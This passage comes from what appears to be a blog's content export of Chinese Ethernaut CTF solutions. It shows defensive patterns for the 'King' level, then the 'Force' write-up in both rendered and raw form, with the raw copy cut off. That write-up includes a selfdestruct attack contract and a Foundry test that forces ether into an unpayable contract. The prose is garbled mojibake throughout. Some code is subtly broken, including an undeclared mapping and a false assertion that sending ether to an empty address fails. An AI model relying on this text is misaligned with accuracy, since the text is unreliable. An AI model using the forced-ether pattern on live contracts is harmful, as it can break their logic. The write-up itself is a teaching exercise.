âœ… å®‰å…¨ï¼šPull Payment</span><br><span class=\"line\">contract SecureKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    mapping(address =&gt; uint) public pendingWithdrawals;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è®°å½•å¾…æå–é‡‘é¢</span><br><span class=\"line\">        if (king != address(0)) &#123;</span><br><span class=\"line\">            pendingWithdrawals[king] += prize;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // è®©ç”¨æˆ·è‡ªå·±æå–èµ„é‡‘</span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        uint amount = pendingWithdrawals[msg.sender];</span><br><span class=\"line\">        require(amount &gt; 0, &quot;No funds to withdraw&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        pendingWithdrawals[msg.sender] = 0;</span><br><span class=\"line\">        payable(msg.sender).transfer(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨-call-å¹¶å¤„ç†å¤±è´¥\"><a href=\"#2-ä½¿ç”¨-call-å¹¶å¤„ç†å¤±è´¥\" class=\"headerlink\" title=\"2. ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥\"></a>2. ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ImprovedKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        require(msg.value &gt;= prize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ä½¿ç”¨ call å¹¶å¤„ç†å¤±è´¥</span><br><span class=\"line\">        if (king != address(0)) &#123;</span><br><span class=\"line\">            (bool success, ) = payable(king).call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class=\"line\">            if (!success) &#123;</span><br><span class=\"line\">                // è®°å½•å¤±è´¥çš„æ”¯ä»˜ï¼Œè®©ç”¨æˆ·æ‰‹åŠ¨æå–</span><br><span class=\"line\">                pendingWithdrawals[king] += prize;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        king = msg.sender;</span><br><span class=\"line\">        prize = msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶\"><a href=\"#3-å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶\" class=\"headerlink\" title=\"3. å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶\"></a>3. å®ç°ç´§æ€¥åœæ­¢æœºåˆ¶</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SafeKing &#123;</span><br><span class=\"line\">    address public king;</span><br><span class=\"line\">    uint public prize;</span><br><span class=\"line\">    bool public paused;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier whenNotPaused() &#123;</span><br><span class=\"line\">        require(!paused);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function pause() public onlyOwner &#123;</span><br><span class=\"line\">        paused = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unpause() public onlyOwner &#123;</span><br><span class=\"line\">        paused = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable whenNotPaused &#123;</span><br><span class=\"line\">        // æ­£å¸¸é€»è¾‘</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id=\"DoS-æ”»å‡»æ£€æµ‹\"><a href=\"#DoS-æ”»å‡»æ£€æµ‹\" class=\"headerlink\" title=\"DoS æ”»å‡»æ£€æµ‹\"></a>DoS æ”»å‡»æ£€æµ‹</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ£€æµ‹åˆçº¦æ˜¯å¦èƒ½æ¥æ”¶ ETH</span><br><span class=\"line\">function canReceiveEther(address target) public returns (bool) &#123;</span><br><span class=\"line\">    (bool success, ) = target.call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class=\"line\">    return success;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Gas-é™åˆ¶åˆ†æ\"><a href=\"#Gas-é™åˆ¶åˆ†æ\" class=\"headerlink\" title=\"Gas é™åˆ¶åˆ†æ\"></a>Gas é™åˆ¶åˆ†æ</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ forge åˆ†æ Gas ä½¿ç”¨</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --gas-report</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ£€æŸ¥ transfer vs call Gas æ¶ˆè€—</span></span><br><span class=\"line\">cast estimate --value 1000000000000000000 &lt;CONTRACT_ADDRESS&gt; <span class=\"string\">&quot;receive()&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><code>send</code> å’Œ <code>transfer</code> ç°åœ¨å·²è¢«å¼ƒç”¨ï¼Œå³ä½¿æ˜¯ <code>call</code>ï¼Œä½¿ç”¨æ—¶æœ€å¥½æŒ‰ç…§æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼è°ƒç”¨</li>\n<li>å¤–éƒ¨è°ƒç”¨å¿…é¡»è°¨æ…ä½¿ç”¨ï¼Œå¿…é¡»æ­£ç¡®å¤„ç†é”™è¯¯</li>\n<li>Push Payment æ¨¡å¼å®¹æ˜“å—åˆ° DoS æ”»å‡»</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡æ‹’ç»æ¥æ”¶ ETH æ¥ç ´åæ”¯ä»˜æµç¨‹</li>\n<li>åˆ©ç”¨ <code>transfer</code> å¤±è´¥æ—¶çš„å›æ»šç‰¹æ€§</li>\n<li>æˆä¸ºæ°¸ä¹…çš„ kingï¼Œç ´åæ¸¸æˆæœºåˆ¶</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä½¿ç”¨ Pull Payment æ¨¡å¼</li>\n<li>æ­£ç¡®å¤„ç†å¤–éƒ¨è°ƒç”¨å¤±è´¥</li>\n<li>å®ç°ç´§æ€¥åœæ­¢å’Œæ¢å¤æœºåˆ¶</li>\n<li>é¿å…ä¾èµ–å¤–éƒ¨è°ƒç”¨çš„æˆåŠŸ</li>\n</ul>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">ä¸Šä¸€å…³: Level 8 - Vault</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">ä¸‹ä¸€å…³: Level 10 - Re-entrancy</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»","date":"2025-01-25T07:20:00.000Z","updated":"2025-01-25T07:20:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"å­¦ä¹ å¦‚ä½•ä½¿ç”¨ selfdestruct å¼ºåˆ¶å‘åˆçº¦å‘é€ä»¥å¤ªå¸ï¼Œç†è§£åˆçº¦ä½™é¢æ£€æŸ¥çš„å®‰å…¨éšæ‚£ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 7 - Force](https://ethernaut.openzeppelin.com/level/7)  \n> **æ”»å‡»ç±»å‹**: å¼ºåˆ¶è½¬è´¦ã€selfdestruct åˆ©ç”¨  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\n1. **å‘åˆçº¦å‘é€ä»¥å¤ªå¸** - è®© `Force` åˆçº¦çš„ä½™é¢å¤§äº 0\n2. **ç»•è¿‡æ¥æ”¶é™åˆ¶** - åˆçº¦æ²¡æœ‰ payable å‡½æ•°æˆ– fallback\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Force {/*\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =Ã¸= /\n (______)__m_m)\n*/}\n```\n\n**å…³é”®é—®é¢˜**ï¼š\n- åˆçº¦å®Œå…¨ç©ºç™½ï¼Œæ²¡æœ‰ä»»ä½•å‡½æ•°\n- æ²¡æœ‰ `payable` å‡½æ•°æˆ– `fallback/receive` å‡½æ•°\n- æ­£å¸¸æƒ…å†µä¸‹æ— æ³•æ¥æ”¶ä»¥å¤ªå¸\n\n### å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•\n\nå°½ç®¡åˆçº¦æ‹’ç»æ¥æ”¶ä»¥å¤ªå¸ï¼Œä½†æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å¼ºåˆ¶å‘é€ï¼š\n\n1. **selfdestruct()** - åˆçº¦è‡ªæ¯æ—¶å¼ºåˆ¶è½¬ç§»ä½™é¢ â­\n2. **é¢„è®¡ç®—åœ°å€æŒ–çŸ¿** - å‘æœªæ¥åœ°å€é¢„å…ˆå‘é€ä»¥å¤ªå¸\n3. **Coinbase å¥–åŠ±** - ä½œä¸ºçŸ¿å·¥å¥–åŠ±æ¥æ”¶åœ°å€\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// ç›®æ ‡åˆçº¦ - å®Œå…¨ç©ºç™½\ncontract Force {\n    // ç©ºåˆçº¦ï¼Œæ— æ³•æ­£å¸¸æ¥æ”¶ä»¥å¤ªå¸\n}\n\ncontract ForceAttacker {\n    constructor() payable {\n        // æ„é€ å‡½æ•°æ¥æ”¶ä»¥å¤ªå¸\n    }\n    \n    function attack(address payable target) public {\n        // ğŸ¯ å…³é”®æ”»å‡»ï¼šä½¿ç”¨ selfdestruct å¼ºåˆ¶å‘é€ä»¥å¤ªå¸\n        selfdestruct(target);\n    }\n}\n\ncontract ForceTest is Test {\n    Force public force;\n    ForceAttacker public attacker;\n    \n    address public user = makeAddr(\"user\");\n\n    function setUp() public {\n        // éƒ¨ç½² Force åˆçº¦\n        force = new Force();\n        \n        // ç»™ç”¨æˆ·ä¸€äº›ä»¥å¤ªå¸\n        vm.deal(user, 10 ether);\n    }\n\n    function testForceExploit() public {\n        console.log(\"=== æ”»å‡»å‰çŠ¶æ€ ===\");\n        console.log(\"Force åˆçº¦ä½™é¢:\", address(force).balance);\n        \n        vm.startPrank(user);\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶å‘é€ä»¥å¤ªå¸\n        attacker = new ForceAttacker{value: 1 ether}();\n        \n        console.log(\"æ”»å‡»åˆçº¦ä½™é¢:\", address(attacker).balance);\n        \n        // ğŸ¯ æ‰§è¡Œæ”»å‡»ï¼šè‡ªæ¯å¹¶å¼ºåˆ¶å‘é€ä»¥å¤ªå¸\n        attacker.attack(payable(address(force)));\n        \n        vm.stopPrank();\n        \n        console.log(\"=== æ”»å‡»åçŠ¶æ€ ===\");\n        console.log(\"Force åˆçº¦ä½™é¢:\", address(force).balance);\n        console.log(\"æ”»å‡»åˆçº¦ä½™é¢:\", address(attacker).balance);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertGt(address(force).balance, 0);\n        console.log(\"æ”»å‡»æˆåŠŸï¼Force åˆçº¦ç°åœ¨æœ‰ä»¥å¤ªå¸äº†\");\n    }\n    \n    function testNormalTransferFails() public {\n        vm.startPrank(user);\n        \n        // å°è¯•æ­£å¸¸å‘é€ä»¥å¤ªå¸ - åº”è¯¥å¤±è´¥\n        (bool success,) = address(force).call{value: 1 ether}(\"\");\n        assertFalse(success);\n        \n        console.log(\"æ­£å¸¸è½¬è´¦å¤±è´¥ï¼Œå¦‚é¢„æœŸ\");\n        assertEq(address(force).balance, 0);\n        \n        vm.stopPrank();\n    }\n    \n    function testPreComputedAddress() public {\n        // æ¼”ç¤ºé¢„è®¡ç®—åœ°å€æ–¹æ³•\n        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);\n        \n        vm.startPrank(user);\n        \n        // å‘æœªæ¥åœ°å€å‘é€ä»¥å¤ªå¸\n        (bool success,) = futureAddress.call{value: 1 ether}(\"\");\n        assertFalse(success); // åœ°å€ä¸å­˜åœ¨ï¼Œå‘é€å¤±è´¥\n        \n        console.log(\"é¢„è®¡ç®—åœ°å€:\", futureAddress);\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### å…¶ä»–å¼ºåˆ¶å‘é€æ–¹æ³•\n\n```solidity\ncontract AlternativeAttacks {\n    // æ–¹æ³• 2: é¢„è®¡ç®—åœ°å€ (å®é™…ä¸­å¾ˆéš¾å®ç°)\n    function preComputedAttack() public payable {\n        // 1. è®¡ç®—ç›®æ ‡åˆçº¦çš„æœªæ¥éƒ¨ç½²åœ°å€\n        // 2. å‘è¯¥åœ°å€å‘é€ä»¥å¤ªå¸\n        // 3. åœ¨è¯¥åœ°å€éƒ¨ç½²ç›®æ ‡åˆçº¦\n        // æ³¨æ„ï¼šè¿™éœ€è¦æ§åˆ¶éƒ¨ç½²æ—¶æœºï¼Œå®é™…ä¸­å¾ˆå›°éš¾\n    }\n    \n    // æ–¹æ³• 3: ä½œä¸ºçŸ¿å·¥è®¾ç½® coinbase (ä»…ç†è®ºä¸Šå¯èƒ½)\n    function coinbaseAttack() public {\n        // å¦‚æœä½ æ˜¯çŸ¿å·¥ï¼Œå¯ä»¥å°†ç›®æ ‡åœ°å€è®¾ä¸º coinbase\n        // æŒ–çŸ¿å¥–åŠ±ä¼šç›´æ¥å‘é€åˆ°è¯¥åœ°å€\n        // ä½†è¿™éœ€è¦å·¨å¤§çš„ç®—åŠ›æŠ•å…¥\n    }\n}\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. é¿å…ä¾èµ–åˆçº¦ä½™é¢è¿›è¡Œé€»è¾‘åˆ¤æ–­\n\n```solidity\ncontract VulnerableContract {\n    // âŒ å±é™©ï¼šä¾èµ–åˆçº¦ä½™é¢\n    function withdraw() public {\n        require(address(this).balance == 0, \"Contract must be empty\");\n        // å¯è¢« selfdestruct æ”»å‡»ç»•è¿‡\n    }\n}\n\ncontract SafeContract {\n    uint256 private internalBalance;\n    \n    // âœ… å®‰å…¨ï¼šä½¿ç”¨å†…éƒ¨è®°è´¦\n    function deposit() public payable {\n        internalBalance += msg.value;\n    }\n    \n    function withdraw() public {\n        require(internalBalance == 0, \"Internal balance must be zero\");\n        // æ— æ³•è¢«å¤–éƒ¨å¼ºåˆ¶ä¿®æ”¹\n    }\n}\n```\n\n### 2. ä½¿ç”¨å†…éƒ¨çŠ¶æ€å˜é‡\n\n```solidity\ncontract SecureForce {\n    uint256 private receivedAmount;\n    \n    receive() external payable {\n        receivedAmount += msg.value;\n    }\n    \n    function getReceivedAmount() public view returns (uint256) {\n        return receivedAmount; // åªè®¡ç®—ä¸»åŠ¨æ¥æ”¶çš„ä»¥å¤ªå¸\n    }\n    \n    function getTotalBalance() public view returns (uint256) {\n        return address(this).balance; // åŒ…æ‹¬å¼ºåˆ¶å‘é€çš„ä»¥å¤ªå¸\n    }\n}\n```\n\n### 3. æ£€æŸ¥ä½™é¢å˜åŒ–\n\n```solidity\ncontract BalanceMonitor {\n    uint256 private lastKnownBalance;\n    \n    modifier balanceCheck() {\n        uint256 balanceBefore = address(this).balance;\n        _;\n        uint256 balanceAfter = address(this).balance;\n        \n        // æ£€æµ‹æ„å¤–çš„ä½™é¢å˜åŒ–\n        if (balanceAfter != lastKnownBalance) {\n            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);\n        }\n        \n        lastKnownBalance = balanceAfter;\n    }\n    \n    event UnexpectedBalanceChange(uint256 expected, uint256 actual);\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### selfdestruct æœºåˆ¶\n\n```solidity\ncontract SelfDestructExample {\n    constructor() payable {}\n    \n    function destroy(address payable recipient) public {\n        // selfdestruct ä¼šï¼š\n        // 1. é”€æ¯åˆçº¦ä»£ç \n        // 2. å°†æ‰€æœ‰ä»¥å¤ªå¸å‘é€ç»™ recipient\n        // 3. å¼ºåˆ¶å‘é€ï¼Œæ— æ³•è¢«é˜»æ­¢\n        selfdestruct(recipient);\n    }\n}\n```\n\n### åˆçº¦æ¥æ”¶ä»¥å¤ªå¸çš„æ–¹å¼\n\n| æ–¹å¼ | å¯è¢«é˜»æ­¢ | è¯´æ˜ |\n|------|----------|------|\n| **æ­£å¸¸è½¬è´¦** | âœ… æ˜¯ | éœ€è¦ payable å‡½æ•° |\n| **selfdestruct** | âŒ å¦ | å¼ºåˆ¶å‘é€ï¼Œæ— æ³•æ‹’ç» |\n| **é¢„è®¡ç®—åœ°å€** | âŒ å¦ | å‘é€åˆ°æœªæ¥åœ°å€ |\n| **çŸ¿å·¥å¥–åŠ±** | âŒ å¦ | Coinbase å¥–åŠ± |\n\n### å®‰å…¨ç¼–ç¨‹æœ€ä½³å®è·µ\n\n```solidity\n// âŒ ä¸å®‰å…¨çš„æ¨¡å¼\ncontract BadPattern {\n    function criticalFunction() public {\n        require(address(this).balance == 0, \"Must be empty\");\n        // é€»è¾‘...\n    }\n}\n\n// âœ… å®‰å…¨çš„æ¨¡å¼  \ncontract GoodPattern {\n    uint256 private expectedBalance;\n    \n    function criticalFunction() public {\n        require(expectedBalance == 0, \"Expected balance must be zero\");\n        // é€»è¾‘...\n    }\n    \n    function updateExpectedBalance(uint256 amount) private {\n        expectedBalance = amount;\n    }\n}\n```\n\n## ğŸ¯ æ€»ç»“\n\nForce å…³å¡æ•™å¯¼äº†é‡è¦çš„ä»¥å¤ªå¸å¤„ç†åŸåˆ™ï¼š\n\n- âœ… **æ°¸è¿œä¸è¦ä¾èµ– `address(this).balance`** - å¯ä»¥è¢«å¼ºåˆ¶ä¿®æ”¹\n- âœ… **ä½¿ç”¨å†…éƒ¨çŠ¶æ€è·Ÿè¸ªä½™é¢** - æ›´åŠ å®‰å…¨å¯é \n- âœ… **ç†è§£ selfdestruct çš„å¼ºåˆ¶æ€§** - æ— æ³•è¢«åˆçº¦æ‹’ç»\n- âœ… **è®¾è®¡æ—¶è€ƒè™‘æ„å¤–èµ„é‡‘** - å¤„ç†éé¢„æœŸçš„ä»¥å¤ªå¸\n\nè¿™ä¸ªçœ‹ä¼¼ç®€å•çš„æ”»å‡»æ­ç¤ºäº†ä»¥å¤ªåŠè™šæ‹Ÿæœºå±‚é¢çš„é‡è¦ç‰¹æ€§ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 6 - Delegation](/2025/01/25/ethernaut-level-06-delegation/)**\n- **[ä¸‹ä¸€å…³: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","source":"_posts/ethernaut-level-07-force.md","raw":"---\ntitle: 'Ethernaut Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»'\ndate: 2025-01-25 15:20:00\nupdated: 2025-01-25 15:20:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - selfdestruct\n  - å¼ºåˆ¶è½¬è´¦\n  - åˆçº¦ä½™é¢\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"å­¦ä¹ å¦‚ä½•ä½¿ç”¨ selfdestruct å¼ºåˆ¶å‘åˆçº¦å‘é€ä»¥å¤ªå¸ï¼Œç†è§£åˆçº¦ä½™é¢æ£€æŸ¥çš„å®‰å…¨éšæ‚£ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 7 - Force](https://ethernaut.openzeppelin.com/level/7)  \n> **æ”»å‡»ç±»å‹**: å¼ºåˆ¶è½¬è´¦ã€selfdestruct åˆ©ç”¨  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\n1. **å‘åˆçº¦å‘é€ä»¥å¤ªå¸** - è®© `Force` åˆçº¦çš„ä½™é¢å¤§äº 0\n2. **ç»•è¿‡æ¥æ”¶é™åˆ¶** - åˆçº¦æ²¡æœ‰ payable å‡½æ•°æˆ– fallback\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Force {/*\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =Ã¸= /\n (______)__m_m)\n*/}\n```\n\n**å…³é”®é—®é¢˜**ï¼š\n- åˆçº¦å®Œå…¨ç©ºç™½ï¼Œæ²¡æœ‰ä»»ä½•å‡½æ•°\n- æ²¡æœ‰ `payable` å‡½æ•°æˆ– `fallback/receive` å‡½æ•°\n- æ­£å¸¸æƒ…å†µä¸‹æ— æ³•æ¥æ”¶ä»¥å¤ªå¸\n\n### å¼ºåˆ¶å‘é€ä»¥å¤ªå¸çš„æ–¹æ³•\n\nå°½ç®¡åˆçº¦æ‹’ç»æ¥æ”¶ä»¥å¤ªå¸ï¼Œä½†æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å¼ºåˆ¶å‘é€ï¼š\n\n1. **selfdestruct()** - åˆçº¦è‡ªæ¯æ—¶å¼ºåˆ¶è½¬ç§»ä½™é¢ â­\n2. **é¢„è®¡ç®—åœ°å€æŒ–çŸ¿** - å‘æœªæ¥åœ°å€é¢„å…ˆå‘é€ä»¥å¤ªå¸\n3. **Coinbase å¥–åŠ±** - ä½œä¸ºçŸ¿å·¥å¥–åŠ±æ¥æ”¶åœ°å€\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\n// ç›®æ ‡åˆçº¦ - å®Œå…¨ç©ºç™½\ncontract Force {\n    // ç©ºåˆçº¦ï¼Œæ— æ³•æ­£å¸¸æ¥æ”¶ä»¥å¤ªå¸\n}\n\ncontract ForceAttacker {\n    constructor() payable {\n        // æ„é€ å‡½æ•°æ¥æ”¶ä»¥å¤ªå¸\n    }\n    \n    function attack(address payable target) public {\n        // ğŸ¯ å…³é”®æ”»å‡»ï¼šä½¿ç”¨ selfdestruct å¼ºåˆ¶å‘é€ä»¥å¤ªå¸\n        selfdestruct(target);\n    }\n}\n\ncontract ForceTest is Test {\n    Force public force;\n    ForceAttacker public attacker;\n    \n    address public user = makeAddr(\"user\");\n\n    function setUp() public {\n        // éƒ¨ç½² Force åˆçº¦\n        force = new Force();\n        \n        // ç»™ç”¨æˆ·ä¸€äº›ä»¥å¤ªå¸\n        vm.deal(user, 10 ether);\n    }\n\n    function testForceExploit() public {\n        console.log(\"=== æ”»å‡»å‰çŠ¶æ€ ===\");\n        console.log(\"Force åˆçº¦ä½™é¢:\", address(force).balance);\n        \n        vm.startPrank(user);\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦å¹¶å‘é€ä»¥å¤ªå¸\n        attacker = new ForceAttacker{value: 1 ether}();\n        \n        console.log(\"æ”»å‡»åˆçº¦ä½™é¢:\", address(attacker).balance);\n        \n        // ğŸ¯ æ‰§è¡Œæ”»å‡»ï¼šè‡ªæ¯å¹¶å¼ºåˆ¶å‘é€ä»¥å¤ªå¸\n        attacker.attack(payable(address(force)));\n        \n        vm.stopPrank();\n        \n        console.log(\"=== æ”»å‡»åçŠ¶æ€ ===\");\n        console.log(\"Force åˆçº¦ä½™é¢:\", address(force).balance);\n        console.log(\"æ”»å‡»åˆçº¦ä½™é¢:\", address(attacker).balance);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertGt(address(force).balance, 0);\n        console.log(\"æ”»å‡»æˆåŠŸï¼Force åˆçº¦ç°åœ¨æœ‰ä»¥å¤ªå¸äº†\");\n    }\n    \n    function testNormalTransferFails() public {\n        vm.startPrank(user);\n        \n        // å°è¯•æ­£å¸¸å‘é€ä»¥å¤ªå¸ - åº”è¯¥å¤±è´¥\n        (bool success,) = address(force).call{value: 1 ether}(\"\");\n        assertFalse(success);\n        \n        console.log(\"æ­£å¸¸è½¬è´¦å¤±è´¥ï¼Œå¦‚é¢„æœŸ\");\n        assertEq(address(force).balance, 0);\n        \n        vm.stopPrank();\n    }\n    \n    function testPreComputedAddress() public {\n        // æ¼”ç¤ºé¢„è®¡ç®—åœ°å€æ–¹æ³•\n        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);\n        \n        vm.startPrank(user);\n        \n        // å‘æœªæ¥åœ°å€å‘é€ä»¥å¤ªå¸\n        (bool success,) = futureAddress.call{value: 1 ether}(\"\");\n        assertFalse(success); // åœ°å€ä¸å­˜åœ¨ï¼Œå‘é€å¤±è´¥\n        \n        console.log(\"é¢„è®¡ç®—åœ°å€:\", futureAddress);\n        \n        vm.stopPrank();\n    }\n}\n```\n\n### 